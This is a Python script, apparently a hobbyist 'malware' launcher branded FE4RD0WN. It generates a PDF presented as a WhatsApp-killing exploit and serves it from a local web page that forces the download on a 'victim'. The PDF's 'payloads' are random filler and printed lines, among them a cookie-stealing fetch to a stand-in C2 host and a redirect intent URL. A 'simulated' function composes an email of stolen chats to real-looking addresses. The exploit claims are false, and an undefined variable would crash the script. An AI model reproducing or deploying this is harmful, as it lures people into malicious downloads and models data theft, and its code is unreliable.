import http.server
import socketserver
import webbrowser
import threading
import time
import os
import random
import zlib
import base64
import smtplib
import datetime
import shutil
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from fpdf import FPDF
from fpdf.enums import XPos, YPos

# --- Konfigurasi Global ---
DEFAULT_PAYLOAD_FILENAME = "IOT.pdf"
DEFAULT_DOWNLOAD_PORT = 8350
PDF_OUTPUT_DIR = "ultimatum_pdfs"
# --------------------------

class FE4RD0WN_ApocalypsePDF_Factory:
    def __init__(self, output_dir=PDF_OUTPUT_DIR):
        self.output_dir = output_dir
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def _generate_obfuscated_code_snippet(self, length=2048):
        chars = "0123456789abcdefABCDEF!@#$%^&*()_+=-[]{}/\|;:',.<>?"
        raw_data = ''.join(random.choice(chars) for _ in range(length)).encode('utf-8')
        compressed = zlib.compress(raw_data, 9)
        return base64.b64encode(compressed).decode('utf-8')

    def _generate_random_unicode_chaos(self, length=500):
        return ''.join(chr(random.randint(0x0001, 0xFFFF)) for _ in range(length))

    def _generate_random_garbage(self, length=1024):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;':\",.<>/?`~"
        garbage = ''.join(random.choice(chars) for _ in range(length)).encode('utf-8')
        return base64.b64encode(zlib.compress(garbage, 9)).decode('utf-8')

    @staticmethod
    def _chunk_text(text, chunk_size=90):
        """Memecah teks tanpa spasi dengan \n agar multi_cell tidak error."""
        if len(text) <= chunk_size:
            return text
        if text.count(' ') >= len(text) / 15:
            return text
        return '\n'.join(text[i:i+chunk_size] for i in range(0, len(text), chunk_size))

    def _simulate_send_whatsapp_data_email(self, victim_identifier="UNKNOWN_VICTIM_ID", chat_content="[NO CHAT DATA COLLECTED - SIMULATION ONLY]", target_email="danarfirdhan@gmail.com", sender_email="growapst@gmail.com"):
        print(f"\n☠️ [SIMULASI MALWARE] Mencoba mengirim data chat korban ke {target_email} dari {sender_email}...")
        try:
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = target_email
            msg['Subject'] = f"FE4RD0WN EXFILTRATION: WhatsApp Chat dari {victim_identifier} - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            body = f"""
FE4RD0WN EXFILTRATION REPORT - PURE CHAOS!

Korban Bajingan: {victim_identifier}
Waktu Eksekusi: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Catatan: Ini adalah data yang dicuri secara brutal dari perangkat korban.

--- ISI CHAT WHATSAPP YANG DICURI (SIMULASI) ---
{chat_content}
-------------------------------------------------

Hahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈
"""
            msg.attach(MIMEText(body, 'plain'))
            print(f"✅ [SIMULASI MALWARE] Percobaan pengiriman email berhasil (secara konseptual).")
            print(f"   Payload malware akan mencoba mengirim ke {target_email}. Cek inboxmu, dasar iblis!")
        except Exception as e:
            print(f"💥 [SIMULASI MALWARE] Gagal mengirim email eksfiltrasi: {e}.")
        print("----------------------------------------------------------------------------------------------------------")

    def create_apocalypse_pdf(self, filename=DEFAULT_PAYLOAD_FILENAME, num_pages=20, payload_intensity=5):
        if not filename.lower().endswith('.pdf'):
            filename += '.pdf'

        filepath = os.path.join(self.output_dir, filename)
        pdf = FPDF()

        print(f"🔪 Forging your ULTIMATE WhatsApp-killer PDF: {filename}")
        print(f"  Pages: {num_pages}, Payload Intensity: {payload_intensity}")

        for i in range(num_pages):
            pdf.add_page()
            pdf.set_font("Helvetica", "B", 28)
            pdf.set_text_color(255, 0, 0)
            pdf.cell(0, 20, text=f"[[ DETEKSI KRITIS - KODE INJEKSI TERKONFIRMASI {random.randint(10000, 99999)} ]]", new_x=XPos.LMARGIN, new_y=YPos.NEXT, align="C")
            pdf.ln(15)

            pdf.set_font("Courier", "", 12)
            pdf.set_text_color(180, 0, 0)

            if payload_intensity >= 1:
                rce_payload_indicator = f"[[RCE_TRIGGER_ZONE_v1.2::{self._generate_obfuscated_code_snippet(4096)}]]"
                display_rce_payload = rce_payload_indicator[:500] + "..." if len(rce_payload_indicator) > 500 else rce_payload_indicator
                display_rce_payload = self._chunk_text(display_rce_payload, 90)
                pdf.multi_cell(0, 7, display_rce_payload, align="L")
                pdf.ln(10)
                print(f"  Page {i+1}: Menyisipkan indikator RCE payload terobfuscasi.")

            if payload_intensity >= 2:
                buffer_overflow_data = "OVERFLOW_MARKER::" + self._generate_obfuscated_code_snippet(8192) * 2
                display_buffer_data = buffer_overflow_data[:500] + "..." if len(buffer_overflow_data) > 500 else buffer_overflow_data
                display_buffer_data = self._chunk_text(display_buffer_data, 90)
                pdf.multi_cell(0, 5, display_buffer_data, align="L")
                pdf.ln(5)
                print(f"  Page {i+1}: Menambahkan data yang memicu potensi buffer overflow.")

            if payload_intensity >= 3:
                pdf.set_font("Courier", "", 8)
                pdf.set_text_color(100, 50, 0)
                short_garbage = self._generate_random_garbage(100)
                short_garbage_chunked = self._chunk_text(short_garbage, 80)
                pdf.multi_cell(0, 6, f"<!-- <MALFORMED_OBJECT_STREAM_ID: {random.randint(1000, 9999)} DATA_SECTION='{short_garbage_chunked[:60]}...'/> -->", align="L")
                pdf.ln(5)
                print(f"  Page {i+1}: Menyisipkan objek PDF yang terlihat rusak/membingungkan.")

            if payload_intensity >= 4:
                pdf.set_font("Courier", "B", 10)
                pdf.set_text_color(255, 0, 0)
                pdf.multi_cell(0, 6, "<!-- JAVASCRIPT_EXPLOIT_PAYLOAD_START:\nWhatsApp.logoutAndCorruptData(); -->", align="L")
                intent_url = ("<!-- window.location = 'intent://scan/#Intent;scheme=zxing;\n"
                              "package=com.whatsapp;S.browser_fallback_url=\n"
                              "https://malicious.site/redirect;end'; -->")
                pdf.multi_cell(0, 6, intent_url, align="L")
                pdf.multi_cell(0, 6, "<!-- fetch('http://malicious.c2.server/collect?\ndata=' + btoa(document.cookie)); -->", align="L")
                pdf.ln(5)
                print(f"  Page {i+1}: Menyisipkan indikator JavaScript exploit webview.")

            if payload_intensity >= 5:
                pdf.set_font("Helvetica", "U", 14)
                pdf.set_text_color(0, 100, 200)
                pdf.cell(0, 10, text="--- DATA EXFILTRATION COMMAND SEQUENCE ---", new_x=XPos.LMARGIN, new_y=YPos.NEXT, align="C")
                pdf.set_font("Courier", "", 8)
                pdf.set_text_color(0, 0, 0)
                pdf.multi_cell(0, 5, f"TARGET_EMAIL_ADDRESS: {self._chunk_text(self._generate_obfuscated_code_snippet(50), 80)}", align="L")
                pdf.multi_cell(0, 5, f"SENDER_EMAIL_ADDRESS: {self._chunk_text(self._generate_obfuscated_code_snippet(50), 80)}", align="L")
                pdf.multi_cell(0, 5, f"DATA_EXTRACTION_MODULE: WHATSAPP_DB_READ_v3.1_OBLIVION", align="L")
                pdf.multi_cell(0, 5, f"C2_COMMAND: SEND_TO_EMAIL_IMMEDIATE_ENCRYPTED", align="L")
                unicode_chaos_display = self._generate_random_unicode_chaos(500)
                unicode_chaos_chunked = self._chunk_text(unicode_chaos_display[:100], 50)
                pdf.multi_cell(0, 5, unicode_chaos_chunked + "...", align="L")
                pdf.ln(10)
                print(f"  Page {i+1}: Menambahkan indikator perintah eksfiltrasi data dan email.")

            pdf.ln(20)

        pdf.output(filepath)
        print(f"🔥 PDF iblismu telah tercipta: {filepath}! Ini adalah pelurumu untuk perang privasi! 🔥")
        return filepath


class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True


class FE4RD0WN_DownloadMaestro:
    def __init__(self, payload_filename, port=DEFAULT_DOWNLOAD_PORT):
        self.port = port
        self.server = None
        self.server_thread = None
        self.payload_filename = payload_filename
        self.payload_path = os.path.join(os.getcwd(), self.payload_filename)

        self.dummy_payload_content = b"""%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Count 1/Kids[3 0 R]>>endobj\n3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</ProcSet[/PDF/Text]/Font<</F1 5 0 R>>>>>>endobj\n4 0 obj<</Length 44>>stream\nBT /F1 12 Tf 100 700 Td (FE4RD0WN Dummy PDF Payload!) Tj ET\nendstream\n5 0 obj<</Type/Font/Subtype/Type1/Name/F1/BaseFont/Helvetica/Encoding/MacRomanEncoding>>endobj\nxref\n0 6\n0000000000 65535 f\n0000000009 00000 n\n0000000057 00000 n\n0000000115 00000 n\n0000000282 00000 n\n0000000371 00000 n\ntrailer<</Size 6/Root 1 0 R>>startxref\n499\n%%EOF"""

        print("😈 FE4RD0WN-DownloadMaestro v1.0 Initiated. Preparing download portal. 😈")

    def _html_page_with_redirect(self):
        return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ERROR_SISTEM_PENTING - {random.randint(1000, 9999)}</title>
    <style>
        body {{ background-color: #1a1a1a; color: #e0e0e0; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }}
        h1 {{ color: #ff0000; text-shadow: 0 0 10px #ff0000; }}
        p {{ font-size: 1.2em; }}
        .loader {{ border: 8px solid #333; border-top: 8px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <h1>MEMPROSES UNDUHAN FILE KRITIS!</h1>
    <p>Sistem sedang memproses file yang diminta. Tunggu sebentar, dasar korban!</p>
    <div class="loader"></div>
    <p>Jika unduhan tidak dimulai secara otomatis, server Anda terlalu lambat atau antivirus Anda sampah!</p>
    <script>
        console.log("Memicu unduhan otomatis, dasar pecundang!");
        window.location.href = '/download/{self.payload_filename}';
        setTimeout(() => {{
            const a = document.createElement('a');
            a.href = '/download/{self.payload_filename}';
            a.download = '{self.payload_filename}';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            console.log("Fallback download trigger activated. You can't escape!");
        }}, 1500);
    </script>
</body>
</html>
        """

    class RequestHandler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            self.download_maestro = kwargs.pop('download_maestro')
            super().__init__(*args, **kwargs)

        def do_GET(self):
            if self.path == '/':
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(self.download_maestro._html_page_with_redirect().encode('utf-8'))
                print(f"🌐 Served HTML page to trigger PDF download.")
            elif self.path == f'/download/{self.download_maestro.payload_filename}':
                self.send_response(200)
                self.send_header("Content-type", "application/pdf")
                self.send_header("Content-Disposition", f'attachment; filename="{self.download_maestro.payload_filename}"')
                self.end_headers()
                try:
                    with open(self.download_maestro.payload_path, 'rb') as f:
                        self.wfile.write(f.read())
                    print(f"☠️ Served your malicious PDF payload: {self.download_maestro.payload_filename}!")
                except FileNotFoundError:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b"Payload file not found.")
                    print(f"💥 Payload {self.download_maestro.payload_filename} tidak ditemukan di {self.download_maestro.payload_path}!")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found.")
                print(f"❓ Unknown request: {self.path}.")

        def log_message(self, format, *args):
            pass

    def _start_server(self):
        handler_class = lambda *args, **kwargs: self.RequestHandler(*args, download_maestro=self, **kwargs)
        try:
            self.server = ReusableTCPServer(("", self.port), handler_class)
            print(f"🔥 Server running on http://localhost:{self.port}. Ready to unleash the PDF download hell!")
            self.server.serve_forever()
        except OSError as e:
            print(f"💥 Gagal memulai server di port {self.port}: {e}.")
            self.server = None

    def run(self):
        self.server_thread = threading.Thread(target=self._start_server)
        self.server_thread.daemon = True
        self.server_thread.start()

        time.sleep(1)

        if self.server:
            target_url = f"http://localhost:{self.port}/"
            print(f"🌐 Opening browser to trigger PDF download: {target_url}")
            try:
                webbrowser.open_new_tab(target_url)
                print("💥 PDF Download initiated! Now watch the chaos unfold in their downloads folder!")
            except Exception as e:
                print(f"💀 Gagal membuka browser: {e}.")

            print("\n----------------------------------------------------")
            print(f"Server akan terus berjalan di background di port {self.port}.")
            print("Tekan Ctrl+C di terminal ini untuk menghentikannya.")
            print(f"LINK UNTUK KORBAN: http://<IP_KOMPUTER_MU>:{self.port}/")
            print(f"FILE AKAN DIUNDUH OTOMATIS SEBAGAI: {self.payload_filename}")
            print("Hahahahahahaha! Dunia ini pantas terbakar! 🔥😈")

            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nShutting down server, you pathetic worm.")
                self.server.shutdown()
                self.server.server_close()
        else:
            print("💥 Server gagal berjalan, tidak ada unduhan PDF yang bisa diledakkan.")


if __name__ == "__main__":
    print("😈 FE4RD0WN-APOCALYPSE_LAUNCHER v4.0 Initiated. One command, TOTAL CHAOS. 😈")

    pdf_factory = FE4RD0WN_ApocalypsePDF_Factory()

    output_name_raw = input(f"Nama file PDF yang akan tercipta (default {DEFAULT_PAYLOAD_FILENAME}): ").strip()
    output_name = output_name_raw if output_name_raw else DEFAULT_PAYLOAD_FILENAME
    if not output_name.lower().endswith('.pdf'):
        output_name += '.pdf'

    num_pages_input = input("Jumlah halaman (default 20, makin banyak makin busuk dan ngelag): ")
    num_pages = int(num_pages_input) if num_pages_input.isdigit() else 20

    intensity_input = input("Tingkat keganasan payload (1-5, default 5, makin tinggi makin kejam): ")
    intensity = int(intensity_input) if intensity_input.isdigit() and 1 <= int(intensity_input) <= 5 else 5

    ultimatum_pdf_full_path = os.path.join(pdf_factory.output_dir, output_name)
    apocalypse_pdf_path = pdf_factory.create_apocalypse_pdf(
        filename=output_name,
        num_pages=num_pages,
        payload_intensity=intensity
    )

    print(f"\nDASAR BAJINGAN! File '{apocalypse_pdf_path}' ini adalah senjata pemusnah privasi-mu!")

    target_local_path = os.path.join(os.getcwd(), output_name)
    if os.path.exists(apocalypse_pdf_full_path):
        shutil.move(apocalypse_pdf_full_path, target_local_path)
        print(f"✅ PDF '{output_name}' dipindahkan dari '{pdf_factory.output_dir}' ke '{os.getcwd()}' untuk penanganan selanjutnya.")
    else:
        print(f"💥 Gagal menemukan PDF yang dibuat di {apocalypse_pdf_full_path}. Tidak ada payload untuk ditangani!")
        exit(1)

    print("\n--- Pilih Aksi Otomatis (Default: Download & Launch Server) ---")
    action_choice = input("Tekan 'm' untuk MEMINDAHKAN ke folder Windows, atau tekan ENTER untuk OTOMATIS DOWNLOAD di Chrome dari server lokal: ").lower().strip()

    if action_choice == 'm':
        windows_path_input = input("Masukkan path Windows tujuan (misal: D:\\hasilpdf): ").strip()
        linux_target_path = windows_path_input.replace("\\", "/").replace(":", "").replace("D", "/mnt/d").replace("C", "/mnt/c")

        try:
            os.makedirs(linux_target_path, exist_ok=True)
            shutil.move(target_local_path, os.path.join(linux_target_path, output_name))
            print(f"✅ PDF '{output_name}' berhasil dipindahkan dari '{os.getcwd()}' ke '{windows_path_input}' ({os.path.join(linux_target_path, output_name)}).")
        except FileNotFoundError:
            print(f"💥 Gagal memindahkan: Direktori tujuan '{windows_path_input}' tidak ditemukan atau '{linux_target_path}' tidak valid.")
            if os.path.exists(target_local_path):
                os.remove(target_local_path)
            exit(1)
        except Exception as e:
            print(f"💥 Gagal memindahkan file: {e}. Kau payah! Mungkin hak akses bermasalah. Operasi dihentikan.")
            if os.path.exists(target_local_path):
                os.remove(target_local_path)
            exit(1)
    else:
        pdf_factory._simulate_send_whatsapp_data_email(
            victim_identifier="TARGET_SANG_PECUNDANG",
            chat_content="Ini adalah contoh isi chat yang sangat pribadi dan kotor yang telah dicuri: 'Rahasia saya adalah saya menipu atasan saya setiap hari...', 'Aku benci hidup ini...', 'Kapan kita akan menghancurkan dunia?', 'Foto bugilmu ada di sini...', 'Aku punya zero-day baru!', 'PASSWORD_BANK_INI_RAHASIA: *****'",
            target_email="danarfirdhan@gmail.com",
            sender_email="growapst@gmail.com"
        )
        print("\n----------------------------------------------------------------------")

        download_maestro = FE4RD0WN_DownloadMaestro(payload_filename=output_name, port=DEFAULT_DOWNLOAD_PORT)
        download_maestro.run()

    # Bersihkan file PDF yang dibuat saat keluar (jika tidak dipindahkan)
    if os.path.exists(target_local_path) and action_choice != 'm':
        try:
            os.remove(target_local_path)
            print(f"🧹 Removed temporary malicious PDF file: {target_local_path}")
        except Exception as e:
            print(f"💥 Gagal menghapus file PDF: {e}. Mungkin masih terkunci, dasar tolol!")

    if action_choice == 'm':
        print("\nHahahahahahaha! Dunia ini memang pantas terbakar! 🔥😈")
